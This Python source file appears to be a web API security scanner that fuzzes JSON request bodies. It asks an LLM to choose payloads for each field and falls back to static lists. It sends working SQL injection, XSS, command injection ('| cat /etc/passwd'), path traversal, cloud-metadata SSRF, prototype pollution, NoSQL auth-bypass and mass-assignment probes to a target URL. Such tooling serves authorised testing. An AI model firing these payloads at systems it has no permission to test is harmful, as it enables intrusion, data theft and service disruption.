"""Hybrid Body Fuzzer — LLM-planned, deterministically executed.

Two modes:
  1. Deterministic (default): regex-classifies fields, picks static payloads.
  2. Hybrid (when LLM router available): one LLM call per endpoint to generate
     context-aware payloads, then the deterministic engine executes them all.

The hybrid approach gives LLM-quality payload selection at ~$0.001/endpoint
instead of $0.10+ for pure LLM-driven fuzzing.

Additional phases (always run, zero LLM cost):
  - JSON Schema Validation probes: extra fields, wrong types, missing fields
  - JSON Injection probes: key injection, prototype pollution, depth bombs
  - Smart detection: value echo, response diff, boundary acceptance
"""
from __future__ import annotations

import copy
import json
import logging
import re
import time
from dataclasses import dataclass, field
from typing import Any, Callable

import httpx

logger = logging.getLogger(__name__)

LLM_PLAN_PROMPT = """\
You are a security expert. Analyze this API endpoint and its JSON body fields, \
then decide exactly which fields to fuzz and with what payloads.

## Endpoint
- Method: {method}
- URL: {url}
- Baseline status: {baseline_status}

## JSON Body Fields
{fields_table}

## Instructions
For each field worth testing, output a JSON array of objects:
```json
[
  {{"field": "dotted.path", "reason": "why this field matters", "payloads": ["payload1", "payload2", ...]}},
  ...
]
```

Rules:
- Focus on HIGH-RISK fields: auth, PII, financial, IDs, roles, amounts, emails.
- Skip low-value system/telemetry fields (timestamps, versions, UTM params).
- Generate TARGETED payloads per field type:
  - String fields with names like "email" -> email-specific SQLi, XSS, header injection
  - Numeric fields like "amount" -> negative values, zero, overflow, type confusion
  - ID/UUID fields -> IDOR (adjacent IDs, other user IDs), type confusion
  - Auth fields -> bypass payloads, empty strings, SQLi
  - Enum/role fields -> privilege escalation ("admin", "root"), invalid values
  - Boolean fields -> type confusion ("2", "null", "yes")
- Keep total payloads per field between 3-8 (not too few, not too many).
- Consider field RELATIONSHIPS (e.g., fromAccount + toAccount = transfer IDOR).
- Output ONLY the JSON array, nothing else."""


# ═══════════════════════════════════════════════════════════════════════
# Field Classification
# ═══════════════════════════════════════════════════════════════════════

class Priority:
    CRITICAL = 1
    HIGH = 2
    MEDIUM = 3
    LOW = 4


_PII_KEYS = re.compile(
    r"(ssn|social.?security|tax.?id|national.?id|passport|license.?num|"
    r"date.?of.?birth|dob|birth.?date)", re.IGNORECASE)
_AUTH_KEYS = re.compile(
    r"(password|passwd|secret|token|api.?key|auth|credential|session|"
    r"bearer|access.?key|private.?key|client.?secret)", re.IGNORECASE)
_FINANCIAL_KEYS = re.compile(
    r"(amount|price|balance|income|salary|payment|credit|loan|"
    r"account.?num|routing|iban|swift|card.?num|cvv|expir)", re.IGNORECASE)
_CONTACT_KEYS = re.compile(
    r"(email|phone|mobile|address|street|city|state|zip|postal|"
    r"first.?name|last.?name|name|username)", re.IGNORECASE)
_ENUM_KEYS = re.compile(
    r"(status|type|role|level|mode|format|language|country|"
    r"purpose|category|frequency|rating|grade)", re.IGNORECASE)
_SYSTEM_KEYS = re.compile(
    r"(user.?agent|ip.?address|fingerprint|browser|device|platform|"
    r"session.?uuid|session.?id|timestamp|created|updated|version|"
    r"is.?test|is.?mobile|is.?debug|utm|referrer|source)", re.IGNORECASE)


@dataclass
class FieldInfo:
    path: str
    value: Any
    value_type: str
    priority: int
    risk_category: str
    payloads: list[str] = field(default_factory=list)


def classify_field(path: str, value: Any) -> FieldInfo:
    leaf_key = path.split(".")[-1]
    vt = "boolean" if isinstance(value, bool) else "integer" if isinstance(value, int) else \
         "float" if isinstance(value, float) else "string" if isinstance(value, str) else \
         "array" if isinstance(value, list) else "null"

    if _AUTH_KEYS.search(leaf_key) or _AUTH_KEYS.search(path):
        return FieldInfo(path, value, vt, Priority.CRITICAL, "auth")
    if _PII_KEYS.search(leaf_key) or _PII_KEYS.search(path):
        return FieldInfo(path, value, vt, Priority.CRITICAL, "pii")
    if _FINANCIAL_KEYS.search(leaf_key) or _FINANCIAL_KEYS.search(path):
        return FieldInfo(path, value, vt, Priority.CRITICAL, "financial")
    if _CONTACT_KEYS.search(leaf_key) or _CONTACT_KEYS.search(path):
        return FieldInfo(path, value, vt, Priority.HIGH, "contact")
    if _SYSTEM_KEYS.search(leaf_key) or _SYSTEM_KEYS.search(path):
        return FieldInfo(path, value, vt, Priority.LOW, "system")
    if _ENUM_KEYS.search(leaf_key):
        return FieldInfo(path, value, vt, Priority.MEDIUM, "enum")
    if isinstance(value, bool):
        return FieldInfo(path, value, vt, Priority.MEDIUM, "boolean")
    if isinstance(value, (int, float)):
        return FieldInfo(path, value, vt, Priority.HIGH, "numeric")
    if isinstance(value, str) and len(value) > 0:
        return FieldInfo(path, value, vt, Priority.HIGH, "freetext")
    return FieldInfo(path, value, vt, Priority.MEDIUM, "other")


def classify_all_fields(data: Any, prefix: str = "") -> list[FieldInfo]:
    fields: list[FieldInfo] = []
    if isinstance(data, dict):
        for k, v in data.items():
            full = f"{prefix}.{k}" if prefix else k
            if isinstance(v, dict):
                fields.extend(classify_all_fields(v, full))
            elif isinstance(v, list):
                if v and not isinstance(v[0], (dict, list)):
                    fields.append(classify_field(full, v))
                elif v:
                    fields.extend(classify_all_fields(v[0], f"{full}[0]"))
            else:
                fields.append(classify_field(full, v))
    return fields


# ═══════════════════════════════════════════════════════════════════════
# Smart Payload Selection (static fallback)
# ═══════════════════════════════════════════════════════════════════════

SQLI = ["'", "' OR '1'='1", "1; DROP TABLE--", "' UNION SELECT NULL--", "1' AND SLEEP(2)--"]
XSS = ["<script>alert(1)</script>", '"><img src=x onerror=alert(1)>']
CMD = ["; id", "| cat /etc/passwd", "`sleep 2`"]
PATH = ["../../etc/passwd", "..\\..\\windows\\win.ini"]
SSRF = ["http://169.254.169.254/latest/meta-data/"]
HDR_INJECT = ["test\r\nX-Injected: true"]
BIZ_NUM = ["0", "-1", "-99999", "99999999", "0.001", "NaN", "Infinity", "null"]
BIZ_STR = ["", " ", "null", "undefined", "true"]
BIZ_ENUM = ["INVALID_VALUE", "", "admin", "root", "null"]
BIZ_BOOL = ["2", "null", "yes", "1", ""]


def select_payloads(f: FieldInfo) -> list[str]:
    """Fallback: static payload selection based on regex classification."""
    if f.priority == Priority.LOW:
        return []
    cat = f.risk_category
    if cat == "auth":
        return SQLI[:3] + ["", "admin", "' OR '1'='1'--"]
    if cat == "pii":
        return SQLI[:3] + XSS[:2]
    if cat == "financial":
        return BIZ_NUM + SQLI[:2]
    if cat == "contact":
        if "email" in f.path.lower():
            return SQLI[:2] + HDR_INJECT + ["a" * 500 + "@test.com"]
        if "phone" in f.path.lower():
            return SQLI[:2] + ["000000000", "' OR 1=1--"]
        return SQLI[:3] + XSS[:2] + CMD[:2]
    if cat == "numeric":
        return BIZ_NUM + SQLI[:2]
    if cat == "enum":
        return BIZ_ENUM + SQLI[:2]
    if cat == "boolean":
        return BIZ_BOOL
    if cat == "freetext":
        return SQLI[:3] + XSS[:2] + CMD[:2] + PATH[:1] + SSRF[:1]
    return []


# ═══════════════════════════════════════════════════════════════════════
# Hybrid: LLM-Planned Payload Selection (one call per endpoint)
# ═══════════════════════════════════════════════════════════════════════

def _build_fields_table(fields: list[FieldInfo]) -> str:
    lines = ["| Field Path | Type | Current Value | Regex Category | Priority |",
             "|------------|------|---------------|----------------|----------|"]
    for f in fields:
        val_preview = str(f.value)[:40] if f.value is not None else "null"
        lines.append(f"| {f.path} | {f.value_type} | {val_preview} | {f.risk_category} | P{f.priority} |")
    return "\n".join(lines)


async def llm_plan_payloads(
    fields: list[FieldInfo],
    method: str,
    url: str,
    baseline_status: int,
    router: Any,
    model: str,
) -> list[FieldInfo]:
    """Ask the LLM (one call) which fields to fuzz and with what payloads.

    Returns the same FieldInfo list but with LLM-chosen payloads assigned.
    Falls back to static selection on any failure.
    """
    fields_table = _build_fields_table(fields)
    prompt = LLM_PLAN_PROMPT.format(
        method=method, url=url, baseline_status=baseline_status, fields_table=fields_table,
    )
    try:
        response = router.complete(
            model=model,
            messages=[{"role": "user", "content": prompt}],
            max_tokens=2000,
        )
        content = response.choices[0].message.content or ""
        start = content.find("[")
        end = content.rfind("]") + 1
        if start < 0 or end <= start:
            logger.warning("LLM payload plan: no JSON array found, falling back to static")
            return _apply_static_payloads(fields)
        plan = json.loads(content[start:end])
    except Exception as e:
        logger.warning("LLM payload planning failed (%s), falling back to static", e)
        return _apply_static_payloads(fields)

    field_map = {f.path: f for f in fields}
    assigned = set()
    for item in plan:
        if not isinstance(item, dict):
            continue
        path = item.get("field", "")
        payloads = item.get("payloads", [])
        if path in field_map and isinstance(payloads, list) and payloads:
            field_map[path].payloads = [str(p) for p in payloads[:15]]
            field_map[path].priority = min(field_map[path].priority, Priority.HIGH)
            assigned.add(path)
            logger.info("LLM plan: %s -> %d payloads (%s)", path, len(payloads),
                        item.get("reason", "")[:60])

    if not assigned:
        logger.warning("LLM plan returned no usable fields, falling back to static")
        return _apply_static_payloads(fields)

    for f in fields:
        if f.path not in assigned:
            f.payloads = []

    logger.info("LLM planned %d fields for fuzzing (skipped %d)", len(assigned), len(fields) - len(assigned))
    return fields


def _apply_static_payloads(fields: list[FieldInfo]) -> list[FieldInfo]:
    """Apply regex-based static payloads (fallback)."""
    for f in fields:
        f.payloads = select_payloads(f)
    return fields


# ═══════════════════════════════════════════════════════════════════════
# JSON Schema Validation Probes
# ═══════════════════════════════════════════════════════════════════════

def _build_schema_probes(body_data: dict, fields: list[FieldInfo]) -> list[tuple[str, dict, str]]:
    """Generate JSON bodies that test whether the API enforces schema validation.

    Returns list of (probe_name, mutated_body_dict, description).
    """
    probes: list[tuple[str, dict, str]] = []

    # 1. Extra unknown fields — does the API reject fields not in the schema?
    extra = copy.deepcopy(body_data)
    extra["__injected_admin"] = True
    extra["is_admin"] = True
    extra["role"] = "admin"
    probes.append(("extra_fields_priv_escalation", extra,
                   "Injected unknown fields (is_admin, role=admin). "
                   "If accepted, API has no schema allowlist — mass assignment risk."))

    extra2 = copy.deepcopy(body_data)
    extra2["debug"] = True
    extra2["_internal"] = {"bypass": True}
    extra2["$where"] = "1==1"
    probes.append(("extra_fields_debug_nosql", extra2,
                   "Injected debug=true, _internal, $where. "
                   "Tests for debug mode activation and NoSQL operator injection."))

    # 2. Type confusion — send wrong types for every field
    for f in fields[:8]:
        wrong = copy.deepcopy(body_data)
        if f.value_type == "string":
            wrong = _set_nested(wrong, f.path, 99999)
        elif f.value_type in ("integer", "float"):
            wrong = _set_nested(wrong, f.path, "AAAA_type_confusion")
        elif f.value_type == "boolean":
            wrong = _set_nested(wrong, f.path, "not_a_boolean")
        elif f.value_type == "array":
            wrong = _set_nested(wrong, f.path, "not_an_array")
        else:
            continue
        probes.append((f"type_confusion_{f.path}", wrong,
                       f"Sent wrong type for '{f.path}' ({f.value_type} -> other). "
                       f"If accepted with 200, API has no type validation."))

    # 3. Missing required fields — omit each field one at a time
    for f in fields[:8]:
        missing = copy.deepcopy(body_data)
        missing = _remove_nested(missing, f.path)
        if missing != body_data:
            probes.append((f"missing_field_{f.path}", missing,
                           f"Omitted '{f.path}'. If accepted with 200, "
                           f"API does not validate required fields."))

    # 4. Null injection — set each field to null
    for f in fields[:6]:
        if f.value is None:
            continue
        nulled = _set_nested(copy.deepcopy(body_data), f.path, None)
        probes.append((f"null_value_{f.path}", nulled,
                       f"Set '{f.path}' to null. If accepted, "
                       f"API has no null check on this field."))

    # 5. Empty object/array — replace structured fields with empty
    empty = copy.deepcopy(body_data)
    for k, v in body_data.items():
        if isinstance(v, dict):
            empty[k] = {}
            probes.append((f"empty_object_{k}", copy.deepcopy(empty),
                           f"Replaced '{k}' object with empty {{}}. "
                           f"If accepted, API has no nested schema validation."))
            empty[k] = v
        elif isinstance(v, list):
            empty[k] = []
            probes.append((f"empty_array_{k}", copy.deepcopy(empty),
                           f"Replaced '{k}' array with []. "
                           f"If accepted, API has no minimum items validation."))
            empty[k] = v

    return probes


# ═══════════════════════════════════════════════════════════════════════
# JSON Injection Probes (API-specific attacks)
# ═══════════════════════════════════════════════════════════════════════

def _build_json_injection_probes(body_data: dict) -> list[tuple[str, str, str]]:
    """Generate raw JSON strings that test for JSON-specific injection vulnerabilities.

    Returns list of (probe_name, raw_json_string, description).
    Unlike schema probes, these send raw strings (not dicts) because
    they test malformed/adversarial JSON parsing.
    """
    probes: list[tuple[str, str, str]] = []
    original_json = json.dumps(body_data)

    # 1. Duplicate key injection — last key wins in most parsers
    if body_data:
        first_key = next(iter(body_data))
        dup = original_json.rstrip("}")
        dup += f', "{first_key}": "__INJECTED_DUP_KEY__"}}'
        probes.append(("duplicate_key_injection", dup,
                       f"Duplicate key '{first_key}' with injected value. "
                       "If second value is used, parser is vulnerable to key injection."))

    # 2. Prototype pollution (__proto__, constructor)
    proto_payloads = [
        {"__proto__": {"isAdmin": True, "role": "admin"}},
        {"constructor": {"prototype": {"isAdmin": True}}},
    ]
    for i, pp in enumerate(proto_payloads):
        merged = {**body_data, **pp}
        probes.append((f"prototype_pollution_{i}", json.dumps(merged),
                       f"Injected {list(pp.keys())[0]} for prototype pollution. "
                       "If the app's object inherits isAdmin=true, privilege escalation possible."))

    # 3. Unicode escape bypass
    for f_key in list(body_data.keys())[:3]:
        escaped_key = "".join(f"\\u{ord(c):04x}" for c in f_key)
        raw = original_json.replace(f'"{f_key}"', f'"{escaped_key}"', 1)
        if raw != original_json:
            probes.append((f"unicode_escape_{f_key}", raw,
                           f"Key '{f_key}' sent as unicode escapes (\\uXXXX). "
                           "Tests if WAF/validator can be bypassed with encoding."))
            break

    # 4. Deeply nested object (depth bomb)
    depth_bomb = body_data.copy()
    nested = {"a": True}
    for _ in range(50):
        nested = {"nested": nested}
    depth_bomb["_depth_test"] = nested
    probes.append(("depth_bomb", json.dumps(depth_bomb),
                   "50-level nested object. Tests for stack overflow, "
                   "DoS via recursive parsing, or max-depth enforcement."))

    # 5. Oversized string value
    for f_key, f_val in body_data.items():
        if isinstance(f_val, str):
            oversize = copy.deepcopy(body_data)
            oversize[f_key] = "A" * 100_000
            probes.append(("oversized_string", json.dumps(oversize),
                           f"100KB string in '{f_key}'. Tests max-length enforcement "
                           "and memory handling."))
            break

    # 6. NoSQL operator injection ($gt, $ne, $regex)
    for f_key, f_val in body_data.items():
        if isinstance(f_val, str):
            nosql = copy.deepcopy(body_data)
            nosql[f_key] = {"$ne": ""}
            probes.append(("nosql_ne_operator", json.dumps(nosql),
                           f"NoSQL $ne operator in '{f_key}'. If MongoDB-backed, "
                           "this matches all non-empty values (auth bypass)."))
            nosql2 = copy.deepcopy(body_data)
            nosql2[f_key] = {"$gt": ""}
            probes.append(("nosql_gt_operator", json.dumps(nosql2),
                           f"NoSQL $gt operator in '{f_key}'. "
                           "Matches all values greater than empty string."))
            nosql3 = copy.deepcopy(body_data)
            nosql3[f_key] = {"$regex": ".*"}
            probes.append(("nosql_regex_operator", json.dumps(nosql3),
                           f"NoSQL $regex in '{f_key}'. Matches everything."))
            break

    # 7. JSON content-type mismatch (send as form-urlencoded structure in JSON)
    if body_data:
        first_key = next(iter(body_data))
        ct_bypass = copy.deepcopy(body_data)
        ct_bypass[first_key] = f"{first_key}=injected&admin=true"
        probes.append(("content_type_confusion", json.dumps(ct_bypass),
                       f"URL-encoded string inside JSON field '{first_key}'. "
                       "Tests if server double-parses the value."))

    return probes


# ═══════════════════════════════════════════════════════════════════════
# Helper: nested field manipulation
# ═══════════════════════════════════════════════════════════════════════

def _set_nested(data: dict, field_path: str, value: Any) -> dict:
    """Set a nested field value using dot-notation path."""
    clone = copy.deepcopy(data)
    parts = field_path.split(".")
    current = clone
    for part in parts[:-1]:
        if "[" in part:
            key, idx = part.rstrip("]").split("[")
            current = current[key][int(idx)]
        elif isinstance(current, dict) and part in current:
            current = current[part]
        else:
            return clone
    final = parts[-1]
    if "[" in final:
        key, idx = final.rstrip("]").split("[")
        current[key][int(idx)] = value
    elif isinstance(current, dict):
        current[final] = value
    return clone


def _remove_nested(data: dict, field_path: str) -> dict:
    """Remove a nested field using dot-notation path."""
    clone = copy.deepcopy(data)
    parts = field_path.split(".")
    current = clone
    for part in parts[:-1]:
        if isinstance(current, dict) and part in current:
            current = current[part]
        else:
            return clone
    final = parts[-1].split("[")[0]
    if isinstance(current, dict) and final in current:
        del current[final]
    return clone


# ═══════════════════════════════════════════════════════════════════════
# Deterministic Execution Engine
# ═══════════════════════════════════════════════════════════════════════

ERROR_INDICATORS = [
    "error", "exception", "sql", "syntax", "undefined", "stack trace",
    "internal server", "traceback", "fatal", "mysql", "postgresql",
    "sqlite", "oracle", "unexpected", "parse error",
]


@dataclass
class FuzzResult:
    field_path: str
    field_info: FieldInfo | None
    payload: str
    status_code: int
    baseline_status: int
    body_snippet: str
    anomaly: bool
    anomaly_reasons: list[str]
    reflected: bool
    timing_ms: float
    probe_type: str = "field_fuzz"
    probe_description: str = ""
    value_accepted: bool = False


def _mutate_field(data: dict, field_path: str, value: Any) -> dict:
    """Alias for _set_nested (backward compat)."""
    return _set_nested(data, field_path, value)


def _check_value_accepted(resp_body: str, payload: str, field_path: str) -> bool:
    """Check if the server echoed back the payload value in its response JSON,
    indicating it accepted and stored/processed the value without validation."""
    try:
        resp_data = json.loads(resp_body)
    except (json.JSONDecodeError, TypeError):
        return False
    payload_str = str(payload)
    if len(payload_str) < 3:
        return False
    return _search_value_in_json(resp_data, payload_str)


def _search_value_in_json(data: Any, target: str) -> bool:
    """Recursively search for a value in a JSON structure."""
    if isinstance(data, str) and target in data:
        return True
    if isinstance(data, dict):
        return any(_search_value_in_json(v, target) for v in data.values())
    if isinstance(data, list):
        return any(_search_value_in_json(item, target) for item in data)
    if str(data) == target:
        return True
    return False


def _detect_anomalies(
    resp: httpx.Response,
    resp_body: str,
    baseline_status: int,
    baseline_len: int,
    baseline_json_keys: set[str],
    payload: str,
    elapsed_ms: float,
) -> tuple[list[str], bool, bool]:
    """Detect anomalies in a response. Returns (reasons, reflected, value_accepted)."""
    resp_lower = resp_body.lower()
    reasons: list[str] = []

    if resp.status_code != baseline_status:
        reasons.append(f"status:{baseline_status}->{resp.status_code}")
    if any(ind in resp_lower for ind in ERROR_INDICATORS):
        matched = [i for i in ERROR_INDICATORS if i in resp_lower][:3]
        reasons.append(f"errors:{matched}")
    if baseline_len > 0 and abs(len(resp_body) - baseline_len) / max(baseline_len, 1) > 0.3:
        reasons.append(f"length:{baseline_len}->{len(resp_body)}")
    if elapsed_ms > 3000:
        reasons.append(f"slow:{elapsed_ms:.0f}ms")

    reflected = str(payload) in resp_body if payload else False

    value_accepted = False
    if resp.status_code == baseline_status and resp.status_code in (200, 201):
        value_accepted = _check_value_accepted(resp_body, payload, "")

    try:
        resp_json = json.loads(resp_body)
        if isinstance(resp_json, dict):
            resp_keys = set(_flatten_keys(resp_json))
            new_keys = resp_keys - baseline_json_keys
            if new_keys and len(new_keys) <= 10:
                reasons.append(f"new_keys:{list(new_keys)[:5]}")
    except (json.JSONDecodeError, TypeError):
        pass

    return reasons, reflected, value_accepted


def _flatten_keys(data: dict, prefix: str = "") -> list[str]:
    """Flatten all keys in a nested dict for structural comparison."""
    keys = []
    for k, v in data.items():
        full = f"{prefix}.{k}" if prefix else k
        keys.append(full)
        if isinstance(v, dict):
            keys.extend(_flatten_keys(v, full))
    return keys


async def _send_probe(
    client: httpx.AsyncClient,
    method: str,
    url: str,
    hdrs: dict,
    content: str,
    baseline_status: int,
    baseline_len: int,
    baseline_keys: set[str],
    probe_name: str,
    probe_desc: str,
    probe_type: str,
) -> FuzzResult:
    """Send a single probe request and analyze the response."""
    try:
        start = time.perf_counter()
        resp = await client.request(method, url, headers=hdrs, content=content)
        elapsed = (time.perf_counter() - start) * 1000
        resp_body = resp.text

        reasons, reflected, value_accepted = _detect_anomalies(
            resp, resp_body, baseline_status, baseline_len, baseline_keys,
            probe_name, elapsed,
        )

        if resp.status_code == baseline_status and probe_type in ("schema_probe", "json_injection"):
            reasons.append(f"accepted_as_valid (HTTP {resp.status_code})")

        return FuzzResult(
            field_path=probe_name, field_info=None, payload=content[:300],
            status_code=resp.status_code, baseline_status=baseline_status,
            body_snippet=resp_body[:300], anomaly=True,
            anomaly_reasons=reasons, reflected=reflected,
            timing_ms=round(elapsed, 2), probe_type=probe_type,
            probe_description=probe_desc, value_accepted=value_accepted,
        )
    except Exception as e:
        return FuzzResult(
            field_path=probe_name, field_info=None, payload=content[:300],
            status_code=0, baseline_status=baseline_status, body_snippet=str(e)[:200],
            anomaly=True, anomaly_reasons=[f"error:{e}"], reflected=False,
            timing_ms=0, probe_type=probe_type, probe_description=probe_desc,
        )


async def fuzz_body(
    client: httpx.AsyncClient,
    method: str,
    url: str,
    original_body: str,
    headers: dict[str, str] | None = None,
    max_priority: int = Priority.HIGH,
    on_progress: Callable | None = None,
    llm_router: Any = None,
    llm_model: str | None = None,
) -> list[FuzzResult]:
    """Run body fuzzing with three phases:
    1. Field-level fuzzing (LLM-planned or static payloads)
    2. JSON schema validation probes
    3. JSON injection probes
    """
    try:
        body_data = json.loads(original_body)
    except (json.JSONDecodeError, TypeError):
        logger.warning("Cannot parse body as JSON for fuzzing")
        return []

    fields = classify_all_fields(body_data)
    target_fields = [f for f in fields if f.priority <= max_priority]

    if llm_router and llm_model:
        logger.info("Using HYBRID mode: LLM plans payloads, engine executes")
        if on_progress:
            on_progress("llm_planning", {"fields_count": len(target_fields), "mode": "hybrid"})
        target_fields = await llm_plan_payloads(
            target_fields, method, url, 200, llm_router, llm_model,
        )
        target_fields = [f for f in target_fields if f.payloads]
    else:
        logger.info("Using STATIC mode: regex-classified payloads")
        for f in target_fields:
            f.payloads = select_payloads(f)

    schema_probes = _build_schema_probes(body_data, fields)
    json_inject_probes = _build_json_injection_probes(body_data)

    field_total = sum(len(f.payloads) for f in target_fields)
    grand_total = field_total + len(schema_probes) + len(json_inject_probes)
    logger.info(
        "Body fuzzer: %d field payloads + %d schema probes + %d JSON injection probes = %d total",
        field_total, len(schema_probes), len(json_inject_probes), grand_total,
    )

    hdrs = dict(headers) if headers else {}
    hdrs.setdefault("Content-Type", "application/json")

    try:
        baseline_resp = await client.request(method, url, headers=hdrs, content=original_body)
        baseline_status = baseline_resp.status_code
        baseline_body = baseline_resp.text
        baseline_len = len(baseline_body)
        try:
            baseline_json = json.loads(baseline_body)
            baseline_keys = set(_flatten_keys(baseline_json)) if isinstance(baseline_json, dict) else set()
        except (json.JSONDecodeError, TypeError):
            baseline_keys = set()
    except Exception as e:
        logger.warning("Baseline request failed: %s", e)
        return []

    results: list[FuzzResult] = []
    req_num = 0

    # ── Phase 1: Field-level fuzzing ──
    for f in target_fields:
        for payload in f.payloads:
            req_num += 1
            if on_progress:
                on_progress("fuzz_request", {
                    "field": f.path, "priority": f.priority, "category": f.risk_category,
                    "payload": str(payload)[:80], "request_num": req_num, "total": grand_total,
                })
            try:
                mutated = json.dumps(_mutate_field(body_data, f.path, payload))
                start = time.perf_counter()
                resp = await client.request(method, url, headers=hdrs, content=mutated)
                elapsed = (time.perf_counter() - start) * 1000
                resp_body = resp.text

                reasons, reflected, value_accepted = _detect_anomalies(
                    resp, resp_body, baseline_status, baseline_len,
                    baseline_keys, str(payload), elapsed,
                )

                if value_accepted and f.risk_category in ("auth", "financial", "pii"):
                    reasons.append(f"value_accepted:{f.risk_category}_field")

                results.append(FuzzResult(
                    field_path=f.path, field_info=f, payload=str(payload),
                    status_code=resp.status_code, baseline_status=baseline_status,
                    body_snippet=resp_body[:300],
                    anomaly=bool(reasons) or reflected or value_accepted,
                    anomaly_reasons=reasons, reflected=reflected,
                    timing_ms=round(elapsed, 2), probe_type="field_fuzz",
                    value_accepted=value_accepted,
                ))
            except Exception as e:
                results.append(FuzzResult(
                    field_path=f.path, field_info=f, payload=str(payload),
                    status_code=0, baseline_status=baseline_status, body_snippet=str(e)[:200],
                    anomaly=True, anomaly_reasons=[f"error:{e}"], reflected=False,
                    timing_ms=0, probe_type="field_fuzz",
                ))

    # ── Phase 2: JSON Schema Validation Probes ──
    for probe_name, probe_body, probe_desc in schema_probes:
        req_num += 1
        if on_progress:
            on_progress("schema_probe", {
                "probe": probe_name, "request_num": req_num, "total": grand_total,
            })
        result = await _send_probe(
            client, method, url, hdrs, json.dumps(probe_body),
            baseline_status, baseline_len, baseline_keys,
            probe_name, probe_desc, "schema_probe",
        )
        results.append(result)

    # ── Phase 3: JSON Injection Probes ──
    for probe_name, raw_json, probe_desc in json_inject_probes:
        req_num += 1
        if on_progress:
            on_progress("json_injection", {
                "probe": probe_name, "request_num": req_num, "total": grand_total,
            })
        result = await _send_probe(
            client, method, url, hdrs, raw_json,
            baseline_status, baseline_len, baseline_keys,
            probe_name, probe_desc, "json_injection",
        )
        results.append(result)

    return results


# ═══════════════════════════════════════════════════════════════════════
# Format Results for LLM Context
# ═══════════════════════════════════════════════════════════════════════

def format_fuzz_results_for_llm(results: list[FuzzResult]) -> str:
    anomalies = [r for r in results if r.anomaly]

    field_results = [r for r in results if r.probe_type == "field_fuzz"]
    schema_results = [r for r in results if r.probe_type == "schema_probe"]
    inject_results = [r for r in results if r.probe_type == "json_injection"]
    field_anomalies = [r for r in anomalies if r.probe_type == "field_fuzz"]
    schema_anomalies = [r for r in anomalies if r.probe_type == "schema_probe"]
    inject_anomalies = [r for r in anomalies if r.probe_type == "json_injection"]

    if not anomalies:
        return (f"\n## Body Fuzz Results\n\nTested {len(results)} probes "
                f"({len(field_results)} field payloads, {len(schema_results)} schema probes, "
                f"{len(inject_results)} JSON injection probes). "
                f"No anomalies — all responses matched baseline.\n")

    lines = ["\n## Body Fuzz Results\n",
             f"Tested {len(results)} probes, found {len(anomalies)} anomalies:\n"]

    if field_anomalies:
        lines.append("### Field Fuzzing Anomalies\n")
        for r in field_anomalies:
            cat = r.field_info.risk_category if r.field_info else "?"
            pri = r.field_info.priority if r.field_info else "?"
            lines.append(f"- **{r.field_path}** [{cat}/P{pri}]")
            lines.append(f"  Payload: `{r.payload[:100]}`")
            lines.append(f"  Status: {r.status_code} (baseline: {r.baseline_status}) | {r.timing_ms}ms")
            if r.reflected:
                lines.append(f"  !! REFLECTED in response")
            if r.value_accepted:
                lines.append(f"  !! VALUE ACCEPTED — server processed invalid input without validation")
            if r.anomaly_reasons:
                lines.append(f"  Reasons: {', '.join(r.anomaly_reasons)}")
            lines.append(f"  Response: {r.body_snippet[:150]}")
            lines.append("")

    if schema_anomalies:
        lines.append("### JSON Schema Validation Issues\n")
        for r in schema_anomalies:
            lines.append(f"- **{r.field_path}**: {r.probe_description}")
            lines.append(f"  Status: {r.status_code} | Reasons: {', '.join(r.anomaly_reasons)}")
            lines.append("")

    if inject_anomalies:
        lines.append("### JSON Injection Results\n")
        for r in inject_anomalies:
            lines.append(f"- **{r.field_path}**: {r.probe_description}")
            lines.append(f"  Status: {r.status_code} | Reasons: {', '.join(r.anomaly_reasons)}")
            if r.value_accepted:
                lines.append(f"  !! SERVER PROCESSED INJECTED PAYLOAD")
            lines.append("")

    lines.append("### LLM Follow-up")
    lines.append("Investigate anomalies above with deeper targeted payloads using fuzz_parameter.\n")
    return "\n".join(lines)
